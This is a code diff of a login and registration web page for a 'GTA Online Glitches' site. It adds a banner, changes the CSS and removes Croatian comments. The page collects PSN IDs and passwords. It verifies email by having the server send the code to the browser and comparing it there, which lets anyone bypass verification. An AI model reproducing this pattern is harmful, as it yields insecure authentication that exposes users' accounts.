@@ -5,14 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Platform Access</title>
     <style>
+        /* Novo dodano zaglavlje */
+        .header-banner {
+            width: 100%;
+            padding: 40px 0;
+            text-align: center;
+            background: linear-gradient(180deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 1) 100%);
+            border-bottom: 2px solid rgba(59, 130, 246, 0.3);
+            margin-bottom: 40px;
+            font-size: 2.5em;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+            color: white;
+        }
+
         body { 
             background: #0f172a; 
             color: white; 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             display: flex; 
-            justify-content: center; 
+            flex-direction: column;
             align-items: center; 
-            height: 100vh; 
+            min-height: 100vh; 
             margin: 0; 
         }
         .card { 
@@ -71,15 +86,17 @@
         #msg { 
             font-size: 0.9em; 
             margin-top: 15px; 
-            color: #ef4444; /* Crvena za errore */
+            color: #ef4444; 
             font-weight: bold;
         }
         #msg.success { 
-            color: #22c55e; /* Zelena za uspjeh */
+            color: #22c55e; 
         }
     </style>
 </head>
 <body>
+
+<div class="header-banner">GTA Online Glitches</div>
 
 <div class="card" id="app">
     <h2 id="title">Login</h2>
@@ -105,20 +122,16 @@
     function switchMode() {
         mode = mode === 'login' ? 'register' : 'login';
         
-        // Mijenjanje naslova i gumba
         document.getElementById('title').innerText = mode === 'login' ? 'Login' : 'Register';
         document.getElementById('btn').innerText = mode === 'login' ? 'Sign In' : 'Send Verification Code';
         document.getElementById('toggleText').innerText = mode === 'login' ? 'Don\'t have account? Register' : 'Already have account? Login';
         
-        // Prikazivanje/skrivanje polja
         document.getElementById('emailBox').classList.toggle('hidden', mode === 'login');
-        document.getElementById('codeBox').classList.add('hidden'); // Uvijek sakrij kod polje pri promjeni
+        document.getElementById('codeBox').classList.add('hidden'); 
         
-        // Čišćenje poruka
         document.getElementById('msg').innerText = "";
         document.getElementById('msg').className = "";
         
-        // Čišćenje inputa (opcionalno, ali dobro za UX)
         document.getElementById('vCode').value = "";
     }
 
@@ -126,17 +139,14 @@
         let msgEl = document.getElementById('msg');
         let btn = document.getElementById('btn');
         
-        // Resetiranje poruke na "Loading..." dok čeka server
         msgEl.innerText = "Processing...";
         msgEl.className = "";
 
         let payload = { action: mode, psn: document.getElementById('psn').value, password: document.getElementById('pass').value };
         
-        // REGISTRACIJA
         if (mode === 'register') {
             payload.email = document.getElementById('email').value;
             
-            // Faza 1: Slanje koda
             if (btn.innerText === 'Send Verification Code') {
                 if(!payload.psn || !payload.email || !payload.password) {
                     msgEl.innerText = "Please fill all fields.";
@@ -149,7 +159,7 @@
                 
                 if(res.status === 'codeSent') {
                     savedCode = res.code;
-                    document.getElementById('codeBox').classList.remove('hidden'); // Pokaži polje za kod
+                    document.getElementById('codeBox').classList.remove('hidden'); 
                     btn.innerText = 'Verify & Complete';
                     msgEl.innerText = "Verification code sent to your email!";
                     msgEl.className = "success";
@@ -157,7 +167,6 @@
                     msgEl.innerText = res.message; 
                 }
             } 
-            // Faza 2: Provjera koda i spremanje
             else {
                 if(document.getElementById('vCode').value === savedCode) {
                     payload.action = 'save';
@@ -167,14 +176,13 @@
                     msgEl.innerText = res.message;
                     if(res.status === 'success') {
                         msgEl.className = "success";
-                        btn.classList.add('hidden'); // Sakrij gumb kad je gotovo
+                        btn.classList.add('hidden'); 
                     }
                 } else { 
                     msgEl.innerText = "Invalid verification code!"; 
                 }
             }
         } 
-        // LOGIN
         else {
             if(!payload.psn || !payload.password) {
                 msgEl.innerText = "Please enter PSN ID and Password.";
@@ -187,7 +195,6 @@
             msgEl.innerText = res.message;
             if(res.status === 'success') {
                 msgEl.className = "success";
-                // Ovdje kasnije možeš dodati redirect na neku drugu stranicu nakon uspješnog logina
             }
         }
     }
